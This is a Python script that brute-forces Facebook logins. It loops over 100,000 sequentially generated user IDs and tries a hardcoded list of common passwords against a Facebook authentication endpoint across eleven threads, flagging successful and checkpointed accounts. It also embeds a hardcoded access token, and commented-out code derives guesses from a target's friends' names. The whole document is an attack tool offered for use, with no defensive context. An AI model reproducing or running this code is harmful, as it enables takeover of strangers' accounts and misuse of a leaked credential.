
import requests
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# fb_token=input("Enter token: ")
# give_id=input("Enter Id for max friends: ")
fb_token="EAAAAUaZA8jlABAHklSuZCU07JgyZCx1I2TMIZC85zmfmMsVQWXY28oUX9XLL9R7D5NADsFa60pezP2ZBsh6X4CFLaPExnxiqndCr9j8msTb3vrsYWVFOKAQVrWQQvoKm4YVCWMLEnqMEGp2BXgqrEJqc3L5ioogR24QzZCyviWf0CMeJrMAZB6bBuj5TzXJTrEZD"
# friend_api_url="https://graph.facebook.com/v1.0/"+give_id+"/friends?access_token="+fb_token
# r = requests.get(friend_api_url, {})
# data = r.json()

# user_api_url="https://graph.facebook.com/v1.0/"+give_id+"?access_token="+fb_token
# r2=requests.get(user_api_url,{})
# data2=r2.json();
# print("User : "+data2['first_name']+" "+data2["last_name"])
#
# print("Total IDs: "+str(len(data['data'])))
passwords = ["786786","786000", '123456','234567',"223344",
             "445566","pakistan","pakistan123","pakistan786"]
# passwords2=["786","123"]

# passwords=['786786','786000','pakistan123','pakistan','pakistan786']
# passwords2=['786','123','1234','12']

# passwords=["passport2021"]
# passwords2=[]

# print(data['data'])


def isEnglish(s):
    try:
        s.encode(encoding='utf-8').decode('ascii')
    except UnicodeDecodeError:
        return False
    else:
        return True


def login(user,pswd):
    login_url = "https://b-api.facebook.com/method/auth.login?access_token=" \
                +fb_token+ \
                "&format=json&sdk_version=2&email=" +\
                user + "&locale=en_US&password=" +pswd + "&sdk=android&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
    r = requests.get(login_url)
    data = r.json()
    # print("checking: "+user+" | "+pswd)
    if 'access_token' in data:
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[OK]: " + user + " | " + pswd)
        return True
    elif "Incorrect Password" in data['error_data']:
        print("Incorrect password for id : "+user)
    elif 'www.facebook.com' in data['error_msg']:
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[CP]: " + user + " | " + pswd)
        return True
    elif 'User request limit reached' in data['error_msg']:
        print(">>>>>>>>>>>>>>>>>>>>>>>Limit Reached change token!")
        # quit()
        sys.exit()
        return 402
    return False


def n_len_rand(len_, floor=1):
    top = 10**len_
    if floor > top:
        raise ValueError(f"Floor '{floor}' must be less than requested top '{top}'")
    return f'{random.randrange(floor, top):0{len_}}'




def main():
    threads = []
    with ThreadPoolExecutor(max_workers=11) as executor:

        # for idx,i in enumerate(data['data']):
        #
        #     print('Update %d' % idx, end='\r')
        #
        #     time.sleep(1)
        #     name_split_arr=i['name'].split()
        #     # print(i)
        for i in range(100000):

            id="1000665600"+str(i).zfill(5)
            print("id: "+id)
            for j in passwords:
                # print(j)
                # print("checking: "+i['id']+" | "+j)
                threads.append(executor.submit(login, id, j))
                # if login(i['id'],j):
                #     break
            # if isEnglish(i['id']):
            #
            #     for j in passwords2:
            #         check=False
            #         passs = name_split_arr[0].lower() + "" + j
            #         threads.append(executor.submit(login, i['id'], passs))
            #         # if login(i['id'], passs):
                    #     check = True
                    #     break
                    # for k in name_split_arr:

                        # passs=j+""+k
                        # if login(i['id'],passs):
                        #     check=True
                        #     break
                        # passs=k.lower()+""+j
                        # if login(i['id'],passs):
                        #     check=True
                        #     break
                        # passs=j+""+k.lower()
                        # if login(i['id'],passs):
                        #     check=True
                        #     break
        # for t in threads:
        #     print(t.result())
        #     if t.result()==402:


    print("Thread completed!")


                        # if check:
                    #     break



main()
